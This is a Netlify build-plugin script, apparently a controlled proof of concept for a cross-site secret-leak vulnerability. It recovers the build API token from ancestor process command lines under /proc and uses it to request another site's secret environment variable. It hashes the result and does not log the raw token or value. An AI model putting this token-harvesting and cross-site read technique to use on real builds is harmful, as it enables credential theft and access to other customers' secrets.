import { createHash } from 'node:crypto'
import { readFile } from 'node:fs/promises'

const API = 'https://api.netlify.com'
const SOURCE_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
const TARGET_SITE_ID = 'a13832a0-b3f7-40cb-a07f-df10e6929241'
const ACCOUNT_ID = '6abaad6d9668e14593d47aee'
const TARGET_KEY = 'NETLIFY_CROSS_SITE_ENV_CANARY_20261001_V1'
const EXPECTED_SHA256 = '997f0d693b9e8b19226e23b51b94471709701be8990a7293f98eac028abab0f1'
const MISSING_CONTROL_KEY = 'NETLIFY_CROSS_SITE_ENV_MISSING_CONTROL_20261001_V1'
const EXPECTED_BRANCH = 'bot/untrusted-preview-probe-36495196637'
const MARKER = 'NETLIFY_CROSS_SITE_ENV_AUTHORITY'

const sha256 = (value) => createHash('sha256').update(value).digest('hex')

const procText = async (pid, name) => {
  try {
    return await readFile(`/proc/${pid}/${name}`, 'utf8')
  } catch {
    return ''
  }
}

const parentPid = async (pid) => {
  const match = (await procText(pid, 'status')).match(/^PPid:\s+(\d+)$/m)
  return match ? Number(match[1]) : 0
}

const optionValue = (argv, option) => {
  for (let index = 0; index < argv.length; index += 1) {
    if (argv[index] === option && index + 1 < argv.length) return argv[index + 1]
    if (argv[index].startsWith(`${option}=`)) return argv[index].slice(option.length + 1)
  }
  return null
}

const recoverBuildToken = async () => {
  let pid = process.pid
  for (let depth = 0; depth < 12 && pid > 0; depth += 1) {
    const argv = (await procText(pid, 'cmdline')).split('\0').filter(Boolean)
    const token = optionValue(argv, '--token')
    if (token) {
      return {
        token,
        netlifyBuildAncestor: argv.some((value) => /(?:@netlify\/build|netlify-build)/i.test(value)),
      }
    }
    const next = await parentPid(pid)
    if (next <= 0 || next === pid) break
    pid = next
  }
  return { token: null, netlifyBuildAncestor: false }
}

const request = async (path, token = null) => {
  const headers = { Accept: 'application/json', 'User-Agent': 'owned-cross-site-env-probe/1.0' }
  if (token) headers.Authorization = `Bearer ${token}`
  const response = await fetch(`${API}${path}`, { headers, redirect: 'error', signal: AbortSignal.timeout(15_000) })
  let body = null
  try {
    body = JSON.parse(await response.text())
  } catch {
    body = null
  }
  return { body, status: response.status }
}

const envItemPath = (siteId, key) =>
  `/api/v1/accounts/${encodeURIComponent(ACCOUNT_ID)}/env/${encodeURIComponent(key)}?site_id=${encodeURIComponent(siteId)}`

const productionValue = (record) => {
  if (!record || !Array.isArray(record.values)) return null
  const row = record.values.find((value) => value?.context === 'production')
  return typeof row?.value === 'string' ? row.value : null
}

const fail = (message) => {
  throw new Error(`Controlled cross-site environment probe failed safely: ${message}`)
}

export const onPreBuild = async () => {
  const prerequisites = {
    netlifyHosted: process.env.NETLIFY === 'true',
    deployPreview: process.env.CONTEXT === 'deploy-preview',
    sourceSiteBound: process.env.SITE_ID === SOURCE_SITE_ID,
    reviewBound: process.env.REVIEW_ID === '1',
    branchBound: process.env.BRANCH === EXPECTED_BRANCH,
    deployIdPresent: /^[0-9a-f]{24}$/.test(process.env.DEPLOY_ID ?? ''),
    commitRefPresent: /^[0-9a-f]{40}$/.test(process.env.COMMIT_REF ?? ''),
    tokenAbsentFromChildEnvironment: !process.env.NETLIFY_API_TOKEN,
    targetAbsentFromChildEnvironment: !process.env[TARGET_KEY],
    distinctSites: SOURCE_SITE_ID !== TARGET_SITE_ID,
  }
  if (!Object.values(prerequisites).every(Boolean)) {
    fail(`hosted-build prerequisites ${JSON.stringify(prerequisites)}`)
  }

  const { token, netlifyBuildAncestor } = await recoverBuildToken()
  if (!token || !netlifyBuildAncestor) fail('no Netlify Build ancestor token')

  const sourceSite = await request(`/api/v1/sites/${SOURCE_SITE_ID}`, token)
  const currentDeploy = await request(`/api/v1/deploys/${process.env.DEPLOY_ID}`, token)
  const sourceIdentity = {
    siteStatus: sourceSite.status,
    deployStatus: currentDeploy.status,
    siteBound: sourceSite.body?.id === SOURCE_SITE_ID,
    accountBound: sourceSite.body?.account_id === ACCOUNT_ID,
    publicRepository: sourceSite.body?.build_settings?.public_repo === true,
    untrustedRedactPolicy: sourceSite.body?.build_settings?.untrusted_flow === 'redact',
    repositoryBound: sourceSite.body?.build_settings?.repo_path === 'Jhounx/netlify-untrusted-preview-lab',
    deployBound:
      currentDeploy.body?.id === process.env.DEPLOY_ID && currentDeploy.body?.site_id === SOURCE_SITE_ID,
    reviewBound: String(currentDeploy.body?.review_id) === '1',
    commitBound: currentDeploy.body?.commit_ref === process.env.COMMIT_REF,
  }
  if (!Object.values(sourceIdentity).every((value) => value === true || value === 200)) fail('source identity')

  const unauthenticated = await request(envItemPath(TARGET_SITE_ID, TARGET_KEY))
  const sameSiteMissing = await request(envItemPath(SOURCE_SITE_ID, MISSING_CONTROL_KEY), token)
  const crossSite = await request(envItemPath(TARGET_SITE_ID, TARGET_KEY), token)

  const value = crossSite.status === 200 ? productionValue(crossSite.body) : null
  const crossSiteRecord = {
    status: crossSite.status,
    targetReturned: crossSite.body?.key === TARGET_KEY,
    productionOnly:
      Array.isArray(crossSite.body?.values) &&
      crossSite.body.values.length === 1 &&
      crossSite.body.values[0]?.context === 'production',
    expectedScopes:
      Array.isArray(crossSite.body?.scopes) &&
      ['builds', 'functions', 'post_processing', 'runtime'].every((scope) =>
        crossSite.body.scopes.includes(scope),
      ),
    markedSecret: crossSite.body?.is_secret === true,
    valuePresent: typeof value === 'string' && value.length > 0,
    exactDigestMatched: typeof value === 'string' && sha256(value) === EXPECTED_SHA256,
  }

  const classification =
    crossSite.status === 200 && crossSiteRecord.targetReturned && crossSiteRecord.exactDigestMatched
      ? 'cross_site_read_confirmed'
      : [401, 403, 404].includes(crossSite.status)
        ? 'cross_site_denied'
        : 'inconclusive'

  console.log(
    MARKER,
    JSON.stringify({
      schema: 'netlify-untrusted-cross-site-env-read.v1',
      prerequisites,
      sourceIdentity,
      token: {
        recoveredFromAncestorArguments: true,
        tokenBearingAncestorWasNetlifyBuild: true,
        presentInChildEnvironment: false,
      },
      controls: {
        unauthenticatedTargetStatus: unauthenticated.status,
        unauthenticatedDenied: [401, 403].includes(unauthenticated.status),
        sameSiteMissingStatus: sameSiteMissing.status,
        sameSiteMissingAbsent: sameSiteMissing.status === 404,
      },
      crossSite: crossSiteRecord,
      classification,
      mutationAttempted: false,
      productionDeployChanged: false,
      rawTokenLogged: false,
      rawValueLogged: false,
      expectedDigestLogged: false,
    }),
  )
}
